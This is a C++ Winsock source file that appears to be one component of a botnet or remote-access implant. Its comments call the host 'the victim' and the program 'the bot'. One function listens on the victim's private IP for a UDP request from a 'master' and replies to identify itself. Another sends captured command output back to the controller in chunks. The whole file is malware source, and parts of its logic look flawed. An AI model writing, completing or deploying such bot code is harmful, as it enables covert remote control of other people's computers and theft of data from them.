#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include"Network.h"
#include<WinSock2.h>
#include<Ws2tcpip.h>
#include<windows.h>
#pragma comment(lib, "ws2_32.lib")

#include "Utils.h"

uint32_t findMastersIP()
{
    sockaddr_in recvAddr{};
    sockaddr_in sendAddr{};

    SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s == INVALID_SOCKET)
        std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
    
    int opt;

    std::string message, response;
    char* buf = new char[65536];
    int fromlen;

    /* setting the socket on the victims private ip i.e "10.0.0.8" and on port*/
    recvAddr.sin_addr.s_addr = getPrivateIP();
    recvAddr.sin_port = htons(UDP_PORT);
    recvAddr.sin_family = AF_INET;

    opt = 1;
    /* the OS won't block the port after the application ended*/
    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt))<0)
        std::cout << "Sockopt error <" << WSAGetLastError() << ">" << std::endl;

    /* binding the socket to the port on the private ip*/
    if(bind(s, (sockaddr*)&recvAddr, sizeof recvAddr) < 0)
        std::cout << "Bind error <" << WSAGetLastError() << ">" << std::endl;

    /*fixed messages for my "protocol"*/
    message = "What is your IP?";
    response = "My IP";

    while (1)
    {
        /*wait for the master to ask me to connect*/
        do {
            ZeroMemory(buf, 65536);
            fromlen = sizeof(recvAddr);
            if (recvfrom(s, buf, 65536, 0, (sockaddr*)&recvAddr, &fromlen) < 0)
            {
                std::cout << "Recieve error <" << WSAGetLastError() << ">" << std::endl;
                goto errorLable;
            }
        } while (!(std::string(buf) == std::to_string(protocol::REQ)));

        /* send reply that it's the bot*/
        if (sendto(s, std::to_string(protocol::RPY).c_str(), response.size(), 0, (sockaddr*)&recvAddr, sizeof(recvAddr)) < 0)
            break;
    }

errorLable:
    delete[] buf;
    closesocket(s);
    return recvAddr.sin_addr.s_addr;
}

int sendStdOut(SOCKET s, std::string& message)
{
    std::string part;

    /* in case the command has no output*/
    if (message.size() == 0)
    {
        part = "no output";
        if (send(s, part.c_str(), part.size(), 0) < 0)
            return 1;
    }

    /* spilitting messages to 4096*/
    while (message.size() >= 4096)
    {
        part = message.substr(0, 4095);
        message = message.substr(4095);
        if(send(s, part.c_str(), part.size(), 0) < 0)
            return 1;
    }

    /* send the rest of the packet*/
    if(send(s, message.c_str(), message.size(), 0) < 0)
        return 1;

    return 0;
}
